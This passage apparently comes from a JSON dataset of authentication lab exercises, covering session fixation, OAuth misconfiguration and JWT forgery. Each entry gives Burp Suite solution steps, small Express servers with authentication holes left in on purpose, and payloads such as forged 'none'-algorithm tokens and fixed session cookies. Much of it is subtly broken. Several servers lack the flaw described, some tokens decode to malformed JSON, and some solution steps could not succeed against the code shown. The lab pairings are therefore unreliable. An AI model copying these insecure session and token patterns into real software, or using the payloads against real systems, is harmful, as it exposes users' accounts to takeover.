      "Lab Description": "This lab is vulnerable to session fixation, where an attacker can set a valid session ID for the victim and force them to authenticate with it. To solve the lab, perform a session fixation attack and access the victim's account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Burp Suite to intercept the login request and note the session ID provided in the response.",
        "2. Set the session ID in the Cookie header of your request before the victim logs in.",
        "3. Submit the login form with the victim's credentials, ensuring that the session ID you set is included.",
        "4. After the victim successfully logs in, use the same session ID to authenticate as the victim and access their account page.",
        "5. Verify the session by viewing the user's account details, confirming the exploitation of the session fixation vulnerability."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'user', password: 'password123' }]; app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const sessionId = req.cookies.session || 'randomSessionId'; res.cookie('session', sessionId); res.send('Logged in'); }); app.get('/account', (req, res) => { const session = req.cookies.session; const user = users.find(u => u.username === 'user' && req.cookies.session === session); if (user) { res.send('Account details for ' + user.username); } else { res.send('Access denied'); } }); const PORT = 3000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:${PORT}'));",
      "payloads": [
        "randomSessionId"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration with sensitive data exposure",
      "Lab Description": "This lab demonstrates an OAuth misconfiguration where an unauthorized user can obtain an access token to access sensitive user data. To solve the lab, exploit the misconfiguration to retrieve sensitive user data by using an OAuth authorization code.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Access the application’s login page and use Burp Suite to capture the OAuth authorization request.",
        "2. Intercept the request and notice that the application incorrectly allows an unauthenticated user to request an authorization code.",
        "3. Modify the authorization code request to include the victim's OAuth client ID and redirect URI.",
        "4. Obtain the authorization code and exchange it for an access token using the authorization code flow.",
        "5. Use the access token to access the user's sensitive data endpoint and confirm successful data retrieval.",
        "6. Verify that unauthorized access was achieved, completing the exploitation of the misconfigured OAuth flow."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const oauthClients = [{ clientId: '12345', clientSecret: 'secret', redirectUri: 'http://localhost:4000/callback' }]; app.get('/authorize', (req, res) => { const { clientId, redirectUri } = req.query; const client = oauthClients.find(c => c.clientId === clientId && c.redirectUri === redirectUri); if (client) { const authCode = 'authCode123'; res.redirect(`${redirectUri}?code=${authCode}`); } else { res.status(400).send('Invalid client'); } }); app.get('/callback', (req, res) => { const { code } = req.query; if (code === 'authCode123') { const accessToken = 'accessToken123'; res.send(`Access token: ${accessToken}`); } else { res.status(400).send('Invalid code'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:${PORT}'));",
      "payloads": [
        "clientId=12345&redirectUri=http://localhost:4000/callback",
        "code=authCode123"
      ]
    },
    {
      "Lab scenario": "JWT Token Forgery via Insecure Signature",
      "Lab Description": "This lab is vulnerable to JWT token tampering. The server improperly validates the signature of a JWT, allowing an attacker to forge a new token with elevated privileges. The application uses JWT for user authentication but lacks proper verification of the token signature. To solve this lab, forge a JWT token for the admin user and access their account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Capture the JWT token during login using Burp Suite's Proxy.",
        "2. Analyze the JWT structure: header, payload, and signature.",
        "3. Decode the base64-encoded JWT and inspect the payload for a user ID or role.",
        "4. Modify the user ID or role in the payload to 'admin' and re-encode the JWT.",
        "5. Sign the new JWT with an insecure algorithm (e.g., 'none') to bypass signature verification.",
        "6. Send the forged JWT in the Authorization header to access the admin's account page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'user', password: 'password123', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, 'secretKey'); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const token = req.headers['authorization'].split(' ')[1]; jwt.verify(token, 'secretKey', (err, decoded) => { if (err) { return res.status(403).send('Invalid token'); } if (decoded.role !== 'admin') { return res.status(403).send('Access denied'); } res.send('Welcome to the admin page'); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Token Forgery Lab running on http://localhost:' + PORT));",
      "payloads": [
        "eyJhbGciOiAiJ25vbmUifQ.eyJ1c2VybmFtZSI6ICJ1c2VyIiwicm9sZSI6ICJ1c2VyIn0.",
        "eyJhbGciOiAiJ25vbmUifQ.eyJ1c2VybmFtZSI6ICJhZG1pbiIsInJvbGU6ICJhZG1pbiJ9."
      ]
    },
    {
      "Lab scenario": "Session Fixation Vulnerability",
      "Lab Description": "This lab demonstrates a session fixation vulnerability. The server does not regenerate the session ID after login, allowing an attacker to set a valid session ID beforehand. The attacker can then hijack the session of another user by setting the session ID to one they control. To solve the lab, set the session ID to an attacker-controlled value and access the victim’s account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Log in to your own account and capture the session cookie using Burp Suite's Proxy.",
        "2. Modify the session cookie value using Burp Suite or browser developer tools to a known session ID.",
        "3. Log out of your account and set the session ID of a different user (e.g., 'victim') to the controlled session ID.",
        "4. Log in again with the victim’s credentials and observe that the session remains active under your control.",
        "5. Use the hijacked session to access the victim's account page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'victim' && password === 'password123') { const sessionID = req.cookies.session || 'new-session-id'; sessions[sessionID] = { username }; res.cookie('session', sessionID); res.send('Logged in successfully'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sessionID = req.cookies.session; if (sessions[sessionID]) { res.send('Account page for ' + sessions[sessionID].username); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
      "payloads": [
        "session=new-session-id",
        "session=victim-controlled-session-id"
      ]
    },
    {
      "Lab scenario": "OAuth Misconfiguration leading to Authorization Bypass",
      "Lab Description": "This lab involves an OAuth misconfiguration. The authorization server is not properly validating scopes, allowing unauthorized users to access restricted resources. The application uses OAuth for authorization, but the scopes are incorrectly configured. To solve this lab, manipulate the OAuth token to request unauthorized access to the admin's resources.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Burp Suite or Postman to intercept the OAuth token request.",
        "2. Analyze the OAuth authorization server's response and extract the access token.",
        "3. Use the access token to request user-specific data from the server's API.",
        "4. Modify the scope of the access token to include 'admin' and send the modified token in the Authorization header.",
        "5. Use the modified token to access the admin's restricted resources."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const oauth2 = require('simple-oauth2'); const app = express(); const oauth2Config = { clientID: 'client-id', clientSecret: 'client-secret', authorizationBaseURL: 'http://localhost:4000/authorize', tokenBaseURL: 'http://localhost:4000/token' }; const users = [{ username: 'admin', password: 'admin123', role: 'admin' }]; app.post('/token', (req, res) => { const { code } = req.body; if (code === 'validCode') { const accessToken = oauth2Config.clientID + ':' + oauth2Config.clientSecret; res.json({ access_token: accessToken }); } else { res.status(400).send('Invalid code'); } }); app.get('/user-data', (req, res) => { const token = req.headers['authorization']; if (token === 'admin') { res.send('Admin data'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));",
      "payloads": [
        "code=validCode&grant_type=authorization_code",
        "Authorization: Bearer admin"
      ]
    },
    {
      "Lab scenario": "JWT Token Tampering to Gain Unauthorized Access",
      "Lab Description": "This lab demonstrates a JWT token vulnerability. The application uses JWT tokens for session management but does not validate the claims properly, allowing an attacker to tamper with the token's payload and gain unauthorized access. To solve the lab, tamper with the JWT token and access the user's account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Intercept the request with Burp Suite and extract the JWT token from the Authorization header.",
        "2. Decode the JWT token to inspect its payload and header.",
        "3. Modify the payload (e.g., change the user ID or role) to impersonate another user.",
        "4. Re-encode the JWT token and replace the old token with the tampered one in the Authorization header.",
        "5. Send the modified request to the server and verify that access is granted to the user account page."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\nconst secretKey = 'secret';\n\nlet users = [{ id: '1', username: 'john', password: 'password123' }];\n\napp.use(express.json());\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    const token = jwt.sign({ id: user.id, username: user.username }, secretKey, { expiresIn: '1h' });\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/account', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (!token) return res.status(401).send('Token required');\n  try {\n    const decoded = jwt.verify(token, secretKey);\n    res.send(`Welcome ${decoded.username}!`);\n  } catch (error) {\n    res.status(403).send('Invalid token');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('JWT Token Tampering Lab running on http://localhost:' + PORT));"
    },
    {
      "Lab scenario": "Session Fixation Exploit",
      "Lab Description": "This lab demonstrates a session fixation vulnerability, where an attacker can set the session ID before a user logs in, gaining access to the victim's session after they authenticate. To solve the lab, fixate the session ID, log in as the victim, and access the victim's account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Start a session on the vulnerable site and intercept the request with Burp Suite.",
        "2. Modify the session ID in the cookies to a known value (the victim's session ID).",
        "3. Send the request with the fixed session ID and wait for the victim to log in.",
        "4. After the victim logs in, verify if you have access to the victim's account by accessing the account page.",
        "5. The lab is solved when you successfully access the victim's account page."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\nlet users = [{ id: '1', username: 'victim', password: 'password123' }];\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    res.cookie('sessionId', '123456');\n    res.send(`Logged in as ${username}`);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/account', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  if (sessionId === '123456') {\n    res.send('Account details for victim');\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));"
    },
    {
      "Lab scenario": "OAuth Misconfiguration - Token Capture",
      "Lab Description": "This lab focuses on an OAuth misconfiguration where an attacker can capture and misuse an OAuth access token to impersonate the victim. The goal is to capture the access token and use it to access a protected resource without authorization.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Set up a listener with Burp Suite to capture the OAuth authorization code in the flow.",
        "2. Intercept the request and extract the authorization code from the URL.",
        "3. Exchange the authorization code for an access token by sending a POST request to the token endpoint.",
        "4. Use the access token in the Authorization header to access a protected API endpoint.",
        "5. The lab is solved when you successfully access the protected resource using the stolen access token."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\nconst oauthClientId = 'client_id';\nconst oauthClientSecret = 'client_secret';\nconst oauthRedirectUri = 'http://localhost:4000/callback';\n\napp.get('/login', (req, res) => {\n  res.redirect(`https://oauthprovider.com/authorize?client_id=${oauthClientId}&redirect_uri=${oauthRedirectUri}&response_type=code`);\n});\n\napp.get('/callback', async (req, res) => {\n  const { code } = req.query;\n  if (code) {\n    const response = await axios.post('https://oauthprovider.com/token', {\n      client_id: oauthClientId,\n      client_secret: oauthClientSecret,\n      code,\n      redirect_uri: oauthRedirectUri,\n      grant_type: 'authorization_code'\n    });\n    const { access_token } = response.data;\n    res.send(`Access token: ${access_token}`);\n  } else {\n    res.status(400).send('Authorization code missing');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  const accessToken = req.headers['authorization']?.split(' ')[1];\n  if (accessToken === 'valid_oauth_token') {\n    res.send('Protected data');\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));"
    },
    {
      "Lab scenario": "Session fixation attack",
      "Lab Description": "This lab's session management is vulnerable to session fixation. A user can be forced to use a fixed session ID, allowing an attacker to hijack the session after login. The application does not regenerate the session ID after authentication. To solve the lab, you need to manipulate the session ID to hijack Carlos’s account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. With Burp Suite running, start an active session on the website. Observe the session cookie used by the application.",
        "2. Try to manually set a fixed session ID before login, using the session cookie value in the HTTP request.",
        "3. Log in with the victim’s credentials while maintaining the fixed session ID.",
        "4. Confirm the session ID persists post-login and verify access to the user's account page.",
        "5. Validate the exploit by accessing Carlos’s account using the fixed session ID."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { let sessionId = req.cookies.sessionId || 'fixed-session'; sessions[sessionId] = username; res.cookie('sessionId', sessionId); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.sessionId; if (sessions[sessionId]) { res.send('Welcome ' + sessions[sessionId]); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
      "payloads": [
        "sessionId=fixed-session",
        "sessionId=12345"
      ]
    },
    {
      "Lab scenario": "JWT tampering and session hijacking",
      "Lab Description": "This lab features a vulnerable JWT implementation where the application does not properly validate the signature of the token. An attacker can modify the payload to impersonate any user. To solve the lab, you need to modify the JWT to access Carlos's account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Log in using your credentials and capture the JWT token in the response headers.",
        "2. Using a tool like Burp Suite or Postman, decode the JWT to view its payload and signature.",
        "3. Modify the payload to change the username to 'carlos' and re-encode the token.",
        "4. In Burp Suite or Postman, replace the old JWT in the Authorization header with the tampered token.",
        "5. Send the modified request to the server and access Carlos’s account page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secretKey = 'mysecretkey'; app.use(express.json()); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, secretKey); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; try { const decoded = jwt.verify(token, secretKey); if (decoded) { res.send('Welcome ' + decoded.username); } } catch (err) { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:' + PORT));",
      "payloads": [
        "Authorization: Bearer tampered-jwt-token",
        "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.-cHZV82kmWmHE19sZjsi7gQW-tbvvV47vhfsdLxlw_A"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration with excessive scopes",
      "Lab Description": "This lab features a vulnerable OAuth implementation where a user can request excessive permissions (scopes) during authorization. The OAuth provider does not properly restrict these scopes. To solve the lab, you need to exploit the OAuth misconfiguration to gain access to Carlos’s account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Begin by launching an OAuth authorization flow with your own credentials.",
        "2. Capture the OAuth authorization request in Burp Suite and examine the scope parameter.",
        "3. Modify the scope parameter to include additional permissions that should not be available.",
        "4. Complete the OAuth authorization flow and retrieve the access token.",
        "5. Use the access token to access Carlos’s account by making API requests with the escalated permissions."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; const oauthClients = [{ clientId: 'abc123', clientSecret: 'secret', redirectUri: 'http://localhost/callback' }]; app.get('/oauth/authorize', (req, res) => { const { client_id, scope } = req.query; if (oauthClients.find(c => c.clientId === client_id)) { const authCode = 'authorization-code'; res.redirect(`${req.query.redirect_uri}?code=${authCode}`); } else { res.status(400).send('Invalid client'); } }); app.post('/oauth/token', (req, res) => { const { client_id, code, redirect_uri } = req.body; if (oauthClients.find(c => c.clientId === client_id)) { const token = 'access-token-with-permission'; res.json({ access_token: token, scope: 'read write' }); } else { res.status(400).send('Invalid client'); } }); app.get('/my-account', (req, res) => { res.send('Welcome carlos'); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));",
      "payloads": [
        "client_id=abc123&scope=read write admin",
        "Authorization: Bearer access-token-with-permission"
      ]
    },
    {
      "Lab scenario": "JWT token manipulation in REST API",
      "Lab Description": "This lab contains a RESTful API with JWT-based authentication. The application does not correctly validate the JWT, allowing for tampering with token data. To solve the lab, manipulate the JWT to access Carlos's admin panel.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Intercept the login request with Burp Suite and obtain the JWT token sent upon successful authentication.",
        "2. Decode the JWT using a base64 decoder to examine the payload, which includes the user roles.",
        "3. Modify the 'role' field from 'user' to 'admin' in the payload and re-encode the token.",
        "4. Replace the original JWT token in the 'Authorization' header of the request with the modified token.",
        "5. Send the modified request to the server and access the admin panel by visiting the admin URL."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(express.json());\n\nconst users = [{ username: 'carlos', password: 'password123' }];\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    const token = jwt.sign({ username: user.username, role: 'user' }, 'secretkey');\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (token) {\n    jwt.verify(token, 'secretkey', (err, decoded) => {\n      if (err || decoded.role !== 'admin') {\n        res.status(403).send('Access denied');\n      } else {\n        res.send('Welcome to the admin panel');\n      }\n    });\n  } else {\n    res.status(401).send('Token missing');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('JWT Lab running on http://localhost:' + PORT));"
    },
    {
      "Lab scenario": "OAuth misconfiguration in third-party integration",
      "Lab Description": "This lab involves an OAuth2-based authentication system integrated with a third-party service. The application is vulnerable due to improper scope and client ID validation. To solve the lab, bypass the OAuth scope restrictions to access admin functionality.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Initiate the OAuth authorization process and obtain the access token using valid credentials.",
        "2. Intercept the OAuth request and examine the authorization URL for incorrect scope or improper client ID.",
        "3. Modify the 'scope' parameter to include 'admin' and use a valid client ID.",
        "4. Exchange the modified authorization code for an access token.",
        "5. Use the new access token to send requests to the admin endpoints and bypass the restrictions."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\napp.use(express.json());\n\napp.get('/oauth/authorize', (req, res) => {\n  res.send('<form action=\"/oauth/token\" method=\"post\"><input type=\"text\" name=\"code\"><button>Exchange Code</button></form>');\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { code, client_id, scope } = req.body;\n  if (client_id === 'valid-client-id' && scope.includes('admin')) {\n    res.json({ access_token: 'admin-token' });\n  } else {\n    res.status(400).send('Invalid scope or client ID');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (token === 'admin-token') {\n    res.send('Welcome to the admin dashboard');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('OAuth Misconfig Lab running on http://localhost:' + PORT));"
    },
    {
      "Lab scenario": "Session fixation vulnerability in SOAP API",
      "Lab Description": "This lab involves a SOAP-based authentication API where the session ID is not properly regenerated upon login. The session ID remains fixed, allowing for session fixation attacks. To solve the lab, fix the session ID and access Carlos's account.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "1. Intercept the login request to the SOAP service with Burp Suite and note the session ID provided in the response.",
        "2. Log out and modify the session ID in the subsequent login request to match the previous session ID.",
        "3. Send the modified login request and observe that the server does not regenerate the session ID, logging you into Carlos's account.",
        "4. Access Carlos's account and solve the lab by visiting the 'My account' page."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst users = [{ username: 'carlos', password: 'password123', session: 'session123' }];\n\napp.post('/login', (req, res) => {\n  const { username, password, session } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    user.session = session || 'session123';\n    res.send(`Logged in with session ${user.session}`);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/my-account', (req, res) => {\n  const session = req.query.session;\n  const user = users.find(u => u.session === session);\n  if (user) {\n    res.send(`Welcome ${user.username}`);\n  } else {\n    res.status(401).send('Invalid session');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('SOAP Session Fixation Lab running on http://localhost:' + PORT));"
    },
    {
      "Lab scenario": "JWT Token Manipulation for Unauthorized Access",
      "Lab Description": "This lab's JWT-based authentication mechanism is vulnerable to token manipulation. The application does not verify the integrity of the JWT token and allows unauthorized access by altering the claims. To solve this lab, you need to access a restricted page by manipulating the JWT token.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Using Burp Suite, intercept the login request and obtain the JWT token from the response.",
        "2. Decode the JWT token using an online tool or Burp Suite's built-in decoder to view the payload.",
        "3. Identify the 'role' claim in the payload and modify it to an admin role.",
        "4. Re-encode the token and replace the original JWT token in the Authorization header of the request.",
        "5. Send the modified request to access the admin page and solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secretKey = 'mySecretKey'; const users = [{ username: 'user1', password: 'password1', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, secretKey, { expiresIn: '1h' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const token = req.headers['authorization']; if (!token) return res.status(403).send('No token provided'); jwt.verify(token, secretKey, (err, decoded) => { if (err) return res.status(401).send('Unauthorized'); if (decoded.role === 'admin') { res.send('Welcome, admin!'); } else { res.status(403).send('Access denied'); } }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Manipulation Lab running on http://localhost:' + PORT));",
      "payloads": [
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwicm9sZSI6ImFkbWluIn0.YGv4hTyLg3vZTrqD4H5UtYqaE5dzzAGy",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwicm9sZSI6ImFkbWluIn0.XzDqz18m5Hp-MHK-ztfFSb-y_Ma2dq3k"
      ]
    },
    {
      "Lab scenario": "Session Fixation Attack via Manipulated Session ID",
      "Lab Description": "This lab contains a session management vulnerability where the session ID is set prior to authentication. An attacker can exploit this by manipulating the session ID before login to gain unauthorized access. To solve the lab, you need to log into Carlos’s account by fixing the session ID.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Using Burp Suite, intercept the login request and note the session cookie that is set before authentication.",
        "2. Manually modify the session cookie to the session ID of Carlos’s account.",
        "3. Send the request to the server with the fixed session ID.",
        "4. The server should authenticate the request with the fixed session ID and log you into Carlos's account.",
        "5. Access Carlos’s account page to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: { password: 'password123', session: 'carlosSession' }, admin: { password: 'admin123', session: 'adminSession' } }; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users[username]; if (user && user.password === password) { res.cookie('session', user.session); res.send('Logged in'); } else { res.send('Invalid credentials'); } }); app.get('/account', (req, res) => { const session = req.cookies.session; const user = Object.keys(users).find(u => users[u].session === session); if (user) { res.send('Welcome ' + user); } else { res.send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
      "payloads": [
        "session=carlosSession",
        "session=adminSession"
      ]
    },
    {
      "Lab scenario": "OAuth Misconfiguration Leading to Privilege Escalation",
      "Lab Description": "This lab demonstrates an OAuth misconfiguration where the application grants elevated permissions based on a misconfigured authorization server. The attacker can exploit this misconfiguration to escalate privileges. To solve this lab, you need to obtain admin-level access.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Postman to initiate the OAuth authorization flow by sending a request to the authorization endpoint.",
        "2. Analyze the response from the authorization server and extract the authorization code.",
        "3. Exchange the authorization code for an access token and note the associated scope in the token's payload.",
        "4. Using the access token, send a request to the application's API and attempt to access a restricted admin endpoint.",
        "5. Modify the token’s scope claim to include the 'admin' scope and reissue the request to escalate privileges and solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const oauthConfig = { clientId: 'client123', clientSecret: 'secret456', authUrl: 'https://oauth-server.com/authorize', tokenUrl: 'https://oauth-server.com/token' }; const users = { user1: { role: 'user' }, admin: { role: 'admin' } }; app.post('/login', (req, res) => { const { username, password, code } = req.body; if (username === 'user1' && password === 'password1') { res.json({ access_token: 'token123', scope: 'user' }); } else if (username === 'admin' && password === 'admin123') { res.json({ access_token: 'adminToken', scope: 'admin' }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const token = req.headers['authorization']; if (token === 'adminToken') { res.send('Welcome Admin'); } else { res.status(403).send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));",
      "payloads": [
        "Authorization: Bearer token123",
        "Authorization: Bearer adminToken"
      ]
    },
    {
      "Lab scenario": "JWT Token Manipulation for Unauthorized Access",
      "Lab Description": "In this lab, the application improperly validates JWT tokens for authorization. While logged in, the JWT token is exposed to manipulation and can be used to escalate privileges. The goal is to manipulate the token to gain admin access.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite to intercept the JWT token sent in the Authorization header during login.",
        "2. Analyze the token's structure and identify the claims (e.g., user role).",
        "3. Modify the 'role' claim in the JWT token to 'admin' and re-encode the token.",
        "4. Send the modified JWT token in the Authorization header to access the /admin page.",
        "5. Verify that access to the admin page is granted, confirming the exploitation."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'user', password: 'password', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, 'secretkey'); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const token = req.headers['authorization']; if (!token) return res.status(401).send('Unauthorized'); jwt.verify(token, 'secretkey', (err, decoded) => { if (err || decoded.role !== 'admin') return res.status(403).send('Forbidden'); res.send('Admin access granted'); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Token Manipulation Lab running on http://localhost:${PORT}'));",
      "payloads": [
        "Authorization: Bearer <modified-jwt-token>"
      ]
    },
    {
      "Lab scenario": "Session Fixation Vulnerability in Login Flow",
      "Lab Description": "This lab demonstrates a session fixation vulnerability in the login flow. The application does not regenerate the session ID after a successful login, allowing an attacker to set a session ID and hijack the victim's session.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Using Burp Suite, intercept the POST /login request and note the session ID set in the cookies.",
        "2. Manually modify the session ID to a custom value and send the request to the server.",
        "3. Perform a login attempt with valid credentials while the modified session ID is set in the cookies.",
        "4. Access the /account page using the modified session ID and confirm successful authentication.",
        "5. Verify that the attacker gains access to the victim's account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); const users = [{ username: 'victim', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = user.username; res.send('Logged in successfully'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.session.username) { res.send('Account details for ' + req.session.username); } else { res.status(403).send('Forbidden'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:${PORT}'));",
      "payloads": [
        "Cookie: session=<fixed-session-id>"
      ]
    },
    {
      "Lab scenario": "OAuth Misconfiguration Leading to Account Takeover",
      "Lab Description": "This lab involves an OAuth misconfiguration in a third-party service that allows an attacker to hijack the authorization process and gain unauthorized access to the victim's account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
